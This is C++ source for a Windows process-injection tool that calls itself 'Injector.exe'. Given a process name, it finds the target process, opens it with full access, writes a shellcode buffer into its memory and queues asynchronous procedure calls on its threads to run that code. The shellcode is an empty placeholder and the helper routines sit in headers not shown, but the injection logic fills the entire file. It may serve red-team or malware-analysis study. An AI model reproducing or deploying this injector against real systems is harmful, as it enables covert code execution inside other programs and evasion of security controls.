#include "lattice.h"
#include "apc.h"

unsigned char buf[] = {0};

int wmain(int argc, wchar_t* argv[]) {
		
	if (argc < 2) {
		std::cerr << "Usage: .\\Injector.exe <process name>\n";
		return 1;
	}

std::wstring	     ProcessName{ argv[1] };
std::vector<DWORD> threadIDs  {};
DWORD pid{};

HANDLE  hSnapshotProcess{},
		    hSnapshotThread {},
		    hProcess		    {};

PROCESSENTRY32  Pentry  { .dwSize = sizeof(PROCESSENTRY32) };
THREADENTRY32   Tentry  { .dwSize = sizeof(THREADENTRY32)  };


// Create Process Snapshot
hSnapshotProcess =  snapshotProcess ();
hSnapshotThread  =  snapshotThread  ();

// Find Process
pid      = findProcesses(hSnapshotProcess, &Pentry, ProcessName);
hProcess = OpenProcess  (PROCESS_ALL_ACCESS, FALSE, pid);

// Write shellcode to process
LPVOID pAlloc = lattice::AllocateWriteMemory(hProcess, sizeof buf, buf);
threadIDs = findThreads(hSnapshotThread, &Tentry,pid);
std::wprintf(L"%s Threads found in %s: %d\n",info,ProcessName.c_str(),threadIDs.size());


// Start queuing the threads
std::wprintf(L"%s STARTING INJECTION\n",good);
ApcInject(threadIDs, pAlloc);

CloseHandle(hProcess);
CloseHandle(hSnapshotProcess);
CloseHandle(hSnapshotThread);
lattice::Free(pAlloc, MEM_RELEASE);

  return 0;
}
